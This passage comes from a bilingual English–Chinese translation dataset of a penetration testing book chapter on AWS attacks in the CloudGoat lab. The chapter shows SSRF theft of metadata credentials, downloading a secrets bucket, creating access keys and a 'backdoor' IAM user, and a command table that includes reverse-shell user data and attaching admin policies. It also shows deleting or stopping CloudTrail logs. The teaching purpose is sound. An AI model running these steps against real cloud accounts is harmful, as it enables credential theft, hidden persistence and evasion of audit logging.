  zh: 一旦我们获得了公共 IP 地址，就可以通过端口 `80` 访问实例，你应该能够在服务器上看到*图 8.40*中的错误信息：![](../Images/B17765_08_40.png)
- en: 'Figure 8.40: Accessing the web server on the public IP'
  id: totrans-203
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.40：访问公共 IP 上的 Web 服务器
- en: Attackers can choose to run any type of scanner, such as Nikto or OWASP ZAP,
    on the IP address. When the attackers can trick the web application to make HTTP
    requests on behalf of them to a specific URL, then the application is vulnerable
    to SSRF. In our case, adding `/?url=<attacker controlled URL>` to the IP address
    allows us to control the web application to make HTTP requests on our behalf.
    Let’s use the application to invoke the metadata API to obtain the credentials
    by adding the URL `http://168.254.169.254/latest/meta-data/iam/security/security-credentials/<Nameofthefile>`
    to the parameter shown in *Figure 8.41*, which should retrieve the temporary credentials
    that can be leveraged by the testers:![](../Images/B17765_08_41.png)
  id: totrans-204
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者可以选择在 IP 地址上运行任何类型的扫描器，例如 Nikto 或 OWASP ZAP。当攻击者能够欺骗 Web 应用程序代表他们向特定 URL
    发出 HTTP 请求时，该应用程序就容易受到 SSRF 攻击。在我们的案例中，将`/?url=<attacker controlled URL>`添加到 IP
    地址后，我们就能控制 Web 应用程序代表我们发出 HTTP 请求。让我们利用该应用程序调用元数据 API，通过将 URL `http://168.254.169.254/latest/meta-data/iam/security/security-credentials/<Nameofthefile>`添加到*图
    8.41*所示的参数中，来获取凭证，这将检索可以被测试者利用的临时凭证：![](../Images/B17765_08_41.png)
- en: 'Figure 8.41: Performing an SSRF attack on the web application to retrieve the
    temporary credentials'
  id: totrans-205
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.41：对 Web 应用程序执行 SSRF 攻击以检索临时凭证
- en: Configure the AWS profile within Kali Linux with another profile by running
    `sudo aws configure –profile ec2-temp` as shown in *Figure 8.42*, and additionally,
    make sure the `aws_session_token` is added to the `aws credentials` file and then
    access the S3 buckets by running `sudo aws s3 ls –profile ec2-temp.` That provides
    a bucket called `cg-secret-s3-bucket-<randomid>`:![](../Images/B17765_08_42.png)
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`sudo aws configure –profile ec2-temp`在 Kali Linux 中配置 AWS 配置文件，如*图 8.42*所示，并确保`aws_session_token`已添加到`aws
    credentials`文件中，然后通过运行`sudo aws s3 ls –profile ec2-temp`访问 S3 存储桶。这将列出名为`cg-secret-s3-bucket-<randomid>`的存储桶：![](../Images/B17765_08_42.png)
- en: 'Figure 8.42: Listing the S3 buckets with the temporary credentials'
  id: totrans-207
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.42：列出使用临时凭证的 S3 存储桶
- en: Let’s download the entire contents of this bucket by running `sudo aws s3 sync
    s3://<bucketname><folder><file> location –profile` as shown in the following screenshot.
    Yay! We now have the high-privileged user access details from this bucket. This
    is similar to gaining domain administrative access during internal penetration
    testing:![](../Images/B17765_08_43.png)
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`sudo aws s3 sync s3://<bucketname><folder><file> location –profile`下载此存储桶的全部内容，如下图所示。耶！我们现在从该存储桶获取了高权限用户的访问详情。这类似于在内部渗透测试中获取域管理员权限：![](../Images/B17765_08_43.png)
- en: 'Figure 8.43: Downloading the secrets and configuring Kali Linux with the admin
    profile'
  id: totrans-209
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.43：下载秘密并使用管理员配置文件配置 Kali Linux
- en: After configuring AWS with the `ec2-admin` profile within Kali Linux, attackers
    will now be able to perform any actions in the EC2 environment. As an example,
    we can now view all the users by running `sudo aws iam list-users –profile ec2—admin`
    as shown in *Figure 8.44*:![Text  Description automatically generated](../Images/B17765_08_44.png)
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Kali Linux 中使用`ec2-admin`配置文件配置 AWS 后，攻击者现在可以在 EC2 环境中执行任何操作。例如，我们现在可以通过运行`sudo
    aws iam list-users –profile ec2—admin`来查看所有用户，如*图 8.44*所示：![Text  Description
    automatically generated](../Images/B17765_08_44.png)
- en: 'Figure 8.44: Enumerating the users from the admin profile'
  id: totrans-211
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.44：从管理员配置文件列举用户
- en: View the attached policies specific to the users by running `sudo iam list-attached-user-policies
    –username <nameofuser> --profile ec2-admin` as shown in *Figure 8.45*:![](../Images/B17765_08_45.png)
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`sudo iam list-attached-user-policies –username <nameofuser> --profile ec2-admin`来查看与用户相关联的策略，如*图
    8.45*所示：![](../Images/B17765_08_45.png)
- en: 'Figure 8.45: Accessing the user-attached policies'
  id: totrans-213
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.45：访问用户附加的策略
- en: Note that the following two steps are only for the demonstration purpose of
    how to create an `aws iam` access key and user using the command line. Testers
    must be aware that if these steps are performed on a CloudGoat deployed AWS environment,
    then destroying the instance will not be possible since CloudGoat can only delete
    instances that it creates with the script.
  id: totrans-214
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 请注意，以下两步仅用于演示如何使用命令行创建 `aws iam` 访问密钥和用户。测试人员必须意识到，如果这些步骤在 CloudGoat 部署的 AWS
    环境中执行，那么销毁实例将变得不可能，因为 CloudGoat 只能删除它通过脚本创建的实例。
- en: You should now be able to change any user’s secret key by running `sudo iam
    create-access-key –username <Username> --region us-east-1 –profile ec2-admin`:![Text  Description
    automatically generated](../Images/B17765_08_46.png)
  id: totrans-215
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，你应该能够通过运行 `sudo iam create-access-key –username <Username> --region us-east-1
    –profile ec2-admin` 来更改任何用户的密钥：![文本描述自动生成](../Images/B17765_08_46.png)
- en: 'Figure 8.46: Creating a new access key for a user'
  id: totrans-216
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.46：为用户创建新的访问密钥
- en: Additionally, you can create a new user as a backdoor to access the environment
    by running `sudo aws iam create-user –username backdoor –profile ec2-admin`, and
    that should come up with the new user created with an access key and a secret
    access key as shown in *Figure 8.47*:![Text  Description automatically generated](../Images/B17765_08_47.png)
  id: totrans-217
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此外，你可以通过运行 `sudo aws iam create-user –username backdoor –profile ec2-admin`
    创建一个新用户作为访问环境的后门，并且应该能够看到新用户被创建，附带一个访问密钥和一个密钥访问密钥，如 *图 8.47* 所示：![文本描述自动生成](../Images/B17765_08_47.png)
- en: 'Figure 8.47: Creating a new user for backdoor access'
  id: totrans-218
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.47：为后门访问创建新用户
- en: Testers can now return to the CloudGoat Docker image and destroy the AWS setup
    by running `./cloudgoat.py destroy all` in the terminal.
  id: totrans-219
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 测试人员现在可以返回 CloudGoat Docker 镜像，并通过在终端运行 `./cloudgoat.py destroy all` 来销毁 AWS
    设置。
- en: '*Table 8.3* provides useful command references that pentesters can leverage
    during AWS penetration testing:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: '*表格 8.3* 提供了渗透测试人员在 AWS 渗透测试过程中可以利用的有用命令参考：'
- en: '| **Description** | **Command reference** |'
  id: totrans-221
  prefs: []
  type: TYPE_TB
  zh: '| **描述** | **命令参考** |'
- en: '| Creates a new policy version | `aws iam create-policy-version –policy-arn
    target_policy_arn –policy-document file://path/to/ /policy.json –set-as-default`
    |'
  id: totrans-222
  prefs: []
  type: TYPE_TB
  zh: '| 创建一个新的策略版本 | `aws iam create-policy-version –policy-arn target_policy_arn
    –policy-document file://path/to/ /policy.json –set-as-default` |'
- en: '| Sets the default policy version to an existing version | `aws iam set-default-policy-version
    –policy-arn target_policy_arn –version-id v2` |'
  id: totrans-223
  prefs: []
  type: TYPE_TB
  zh: '| 设置默认策略版本为现有版本 | `aws iam set-default-policy-version –policy-arn target_policy_arn
    –version-id v2` |'
- en: '| Creates an EC2 instance with an existing instance profile | `aws ec2 run-instances
    –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip
    –key-name my_ssh_key –security-group-ids sg-123456``aws ec2 run-instances –image-id
    ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip
    –user-data file://script/with/reverse/shell.sh` |'
  id: totrans-224
  prefs: []
  type: TYPE_TB
  zh: '| 使用现有实例配置文件创建 EC2 实例 | `aws ec2 run-instances –image-id ami-a4dc46db –instance-type
    t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids
    sg-123456``aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro
    –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh`
    |'
- en: '| Creates a new user access key | `aws iam create-access-key –user-name target_user`
    |'
  id: totrans-225
  prefs: []
  type: TYPE_TB
  zh: '| 创建一个新的用户访问密钥 | `aws iam create-access-key –user-name target_user` |'
- en: '| Creates a new login profile | `aws iam create-login-profile –user-name target_user
    –password ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    –no-password-reset-required` |'
  id: totrans-226
  prefs: []
  type: TYPE_TB
  zh: '| 创建一个新的登录配置文件 | `aws iam create-login-profile –user-name target_user –password
    ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    –no-password-reset-required` |'
- en: '| Updates an existing login profile | `aws iam update-login-profile –user-name
    target_user –password ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    -–no-password-reset-required` |'
  id: totrans-227
  prefs: []
  type: TYPE_TB
  zh: '| 更新现有登录配置文件 | `aws iam update-login-profile –user-name target_user –password
    ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    -–no-password-reset-required` |'
- en: '| Attaches a policy to a:UserGroupRole | `aws iam attach-user-policy –user-name
    my_username –policy-arn``arn:aws:iam::aws:policy/AdministratorAccess aws iam attach-group-policy
    –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess``aws
    iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
    |'
  id: totrans-228
  prefs: []
  type: TYPE_TB
  zh: '| 附加策略到用户组角色 | `aws iam attach-user-policy –user-name my_username –policy-arn``arn:aws:iam::aws:policy/AdministratorAccess
    aws iam attach-group-policy –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess``aws
    iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
    |'
- en: '| Creates/updates an inline policy for a:UserGroupRole | `aws iam put-user-policy
    –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/policy.json``aws
    iam put-group-policy –group-name group_i_am_in –policy-name group_inline_policy
    –policy-document file://path/to/policy.json>``aws iam put-role-policy –role-name
    role_i_can_assume –policy-name role_inline_policy –policy-document file://path/to/policy.json`
    |'
  id: totrans-229
  prefs: []
  type: TYPE_TB
  zh: '| 创建/更新用户组角色的内联策略 | `aws iam put-user-policy –user-name my_username –policy-name
    my_inline_policy –policy-document file://path/to/policy.json``aws iam put-group-policy
    –group-name group_i_am_in –policy-name group_inline_policy –policy-document file://path/to/policy.json>``aws
    iam put-role-policy –role-name role_i_can_assume –policy-name role_inline_policy
    –policy-document file://path/to/policy.json` |'
- en: '| Adds a user to a group | `aws iam add-user-to-group –-group-name target_group
    –-user-name username` |'
  id: totrans-230
  prefs: []
  type: TYPE_TB
  zh: '| 将用户添加到组中 | `aws iam add-user-to-group –-group-name target_group –-user-name
    username` |'
- en: '| Updates the `AssumeRolePolicyDocument` of a role | `aws iam update-assume-role-policy
    –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json`
    |'
  id: totrans-231
  prefs: []
  type: TYPE_TB
  zh: '| 更新角色的 `AssumeRolePolicyDocument` | `aws iam update-assume-role-policy –role-name
    role_i_can_assume –policy-document file://path/to/assume/role/policy.json` |'
- en: '| Updates the code of an existing lambda function | `aws lambda update-function-code
    -–function-name target_function –zip-file fileb://my/lambda/code/zipped.zip` |'
  id: totrans-232
  prefs: []
  type: TYPE_TB
  zh: '| 更新现有 Lambda 函数的代码 | `aws lambda update-function-code -–function-name target_function
    –zip-file fileb://my/lambda/code/zipped.zip` |'
- en: 'Table 8.3: Useful AWS commands during penetration testing'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 表 8.3：渗透测试期间有用的 AWS 命令
- en: Obfuscating CloudTrail logs
  id: totrans-234
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 混淆 CloudTrail 日志
- en: 'CloudTrail is a service within Amazon that monitors any actions that are done
    by users. Assuming attackers now have high-privileged access to the environment,
    they will be able to modify the settings by performing the following actions:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: CloudTrail 是亚马逊提供的一个服务，用于监控用户执行的所有操作。假设攻击者现在拥有高度特权的环境访问权限，他们将能够通过执行以下操作来修改设置：
- en: Identify the CloudTrail details by running `sudo aws cloudtrail describe-details
    –profile <profile name>`.
  id: totrans-236
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行 `sudo aws cloudtrail describe-details –profile <profile name>` 来识别 CloudTrail
    详情。
- en: Attackers can choose to perform the removal of trails by running `sudo aws cloudtrail
    delete-trail --name cloudgoat_trail --profile <Profile name>`.
  id: totrans-237
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者可以选择通过运行 `sudo aws cloudtrail delete-trail --name cloudgoat_trail --profile
    <Profile name>` 来删除日志轨迹。
- en: Alternatively, they can stop the logging by running `sudo aws cloudtrail stop-logging
    --name cloudgoat_trail --profile <Profile name>`. However, it will trigger an
    alert in GuardDuty (a threat detection service within AWS) about the logs not
    being captured.
  id: totrans-238
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 或者，他们可以通过运行 `sudo aws cloudtrail stop-logging --name cloudgoat_trail --profile
    <Profile name>` 来停止日志记录。然而，这将触发 GuardDuty（AWS 内部的威胁检测服务）关于日志未被捕捉的警报。
- en: We have explored the important aspects of cloud penetration testing with some
    practical examples. Pentesters should always consider any cloud infrastructure
    as part of the internal/external scope to ensure that objectives are met.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经通过一些实际例子探讨了云渗透测试的关键方面。渗透测试人员应始终将任何云基础设施视为内部/外部范围的一部分，以确保达成测试目标。
- en: Summary
  id: totrans-240
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we took a quick tour of different types of cloud services and
    attacks against those services. We took a deep dive into AWS-specific security
    misconfigurations, particularly the exploitation of remote web application vulnerabilities
    through the logs from the load balancer, and took advantage of a misconfigured
    S3 bucket to gain access to internal EC2 instances. Further, we exploited the
    privileges of the instance in gaining the database credentials and also explored
    metadata service header injection attacks. We learned how to create a backdoor
    user in an AWS environment through an SSRF attack. We then examined some of the
    useful command-line functions that can be utilized in AWS penetration testing.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们快速浏览了不同类型的云服务及其面临的攻击。我们深入探讨了AWS特有的安全配置错误，特别是通过负载均衡器日志利用远程Web应用程序漏洞，并利用配置错误的S3存储桶访问内部EC2实例。此外，我们还利用实例的权限获取了数据库凭证，并探索了元数据服务头注入攻击。我们学习了如何通过SSRF攻击在AWS环境中创建后门用户。然后，我们研究了一些在AWS渗透测试中可以利用的有用命令行功能。
- en: In the next chapter, we will focus more on how to bypass **Network Access Control**
    (**NAC**) and antivirus software, **User Account Control** (**UAC**), and Windows
    operating system controls. We will also explore toolsets such as the Veil Framework
    and Shellter.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将更专注于如何绕过**网络访问控制**（**NAC**）和杀毒软件、**用户帐户控制**（**UAC**）以及Windows操作系统控制。我们还将探讨诸如Veil框架和Shellter等工具集。
